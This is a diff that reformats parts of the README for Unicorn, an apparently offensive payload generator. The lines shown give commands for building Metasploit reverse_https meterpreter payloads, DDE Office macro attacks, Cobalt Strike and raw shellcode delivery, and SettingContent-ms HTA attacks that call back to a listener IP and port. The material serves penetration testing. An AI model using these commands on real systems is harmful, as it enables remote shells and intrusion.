@@ -136,9 +136,9 @@ VBA. You may change the number of characters in each VBA string by passing an in
 
 Examples:
 
-python unicorn.py harmless.ps1
-python unicorn.py myfile.ps1 macro
-python unicorn.py muahahaha.ps1 macro 500
+    python unicorn.py harmless.ps1
+    python unicorn.py myfile.ps1 macro
+    python unicorn.py muahahaha.ps1 macro 500
 
 The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.
 
@@ -156,8 +156,8 @@ https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 
 In order to use this attack, run the following examples:
 
-python unicorn.py <payload> <lhost> <lport> dde
-python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
+    python unicorn.py <payload> <lhost> <lport> dde
+    python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
 
 Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
 unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
@@ -201,7 +201,7 @@ byte[] buf = new byte[836] { 0xfc, etc
 
 Next, for usage:
 
-python unicorn.py cobalt_strike_file.cs cs
+    python unicorn.py cobalt_strike_file.cs cs
 
 The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.
 
@@ -217,11 +217,11 @@ this is a non-problem.
 
 A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
 
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING;
+    typedef struct _UNICODE_STRING {
+        USHORT Length;
+        USHORT MaximumLength;
+        PWSTR  Buffer;
+    } UNICODE_STRING;
 
 For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
 issues.
@@ -241,7 +241,7 @@ the size of 8191. This is the max command line argument size limit in Windows.
 
 Usage:
 
-python uniocrn.py shellcode_formatted_properly.txt shellcode
+    python uniocrn.py shellcode_formatted_properly.txt shellcode
 
 Next simply copy the powershell command to something you have the ability for remote command execution.
 
@@ -256,11 +256,11 @@ applications this is a non-problem.
 
 A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
 
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING;
+    typedef struct _UNICODE_STRING {
+        USHORT Length;
+        USHORT MaximumLength;
+        PWSTR  Buffer;
+    } UNICODE_STRING;
 
 For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no  
 issues.
@@ -290,10 +290,10 @@ shellcode attacks.
 
 The four methods below on usage: 
 
-HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
-HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
-HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
-Generate .SettingContent-ms: python unicorn.py ms
+HTA SettingContent-ms Metasploit: `python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms`  
+HTA Example SettingContent-ms: `python unicorn.py <cobalt_strike_file.cs cs ms`  
+HTA Example SettingContent-ms: `python unicorn.py <patth_to_shellcode.txt>: shellcode ms`  
+Generate .SettingContent-ms: `python unicorn.py ms`
 
 The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
 just a blank .SettingContent-ms file. 
@@ -319,8 +319,8 @@ Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
 
 Usage: 
 
-python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
-python unicorn.py <cobalt_strike_file.cs cs ms
-python unicorn.py <patth_to_shellcode.txt>: shellcode ms
-python unicorn.py ms
+    python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
+    python unicorn.py <cobalt_strike_file.cs cs ms
+    python unicorn.py <patth_to_shellcode.txt>: shellcode ms
+    python unicorn.py ms
 
